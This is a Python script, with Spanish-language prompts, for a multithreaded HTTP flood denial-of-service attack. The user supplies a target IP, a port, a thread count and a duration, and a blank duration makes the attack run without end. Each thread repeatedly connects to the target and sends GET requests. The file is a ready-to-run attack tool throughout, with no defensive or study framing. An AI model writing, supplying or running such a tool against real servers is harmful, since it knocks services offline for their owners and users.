import socket
import threading
import random
import time
from rich.console import Console
from rich.prompt import Prompt
from rich import print

console = Console()

def ddos_attack(ip, port, user_agent, duration=None):
    end_time = time.time() + duration if duration else None
    while True:
        if end_time and time.time() > end_time:
            break
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(3)
                sock.connect((ip, port))
                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
                sock.sendall(request.encode())
                response = sock.recv(1024)
                if response:
                    console.print(f"[bold green]Paquete enviado a {ip}[/bold green]")
                else:
                    console.print(f"[bold red]Sin respuesta de {ip}[/bold red]")
        except Exception as e:
            console.print(f"[bold red]Error al conectar con {ip}:{port} - {e}[/bold red]")

def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
    ]
    return random.choice(user_agents)

def main():
    ip = Prompt.ask("[bold cyan]Ingrese la IP del servidor objetivo[/bold cyan]")
    port = int(Prompt.ask("[bold cyan]Ingrese el puerto del servidor objetivo[/bold cyan]"))
    num_threads = int(Prompt.ask("[bold cyan]Ingrese el número de hilos[/bold cyan]"))
    duration_input = Prompt.ask("[bold cyan]Ingrese la duración del ataque en segundos (dejar en blanco para infinito)[/bold cyan]", default="")
    duration = int(duration_input) if duration_input else None
    user_agent = random_user_agent()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=ddos_attack, args=(ip, port, user_agent, duration))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    console.print(f"[bold green]Ataque finalizado contra {ip}[/bold green]")

if __name__ == "__main__":
    main()
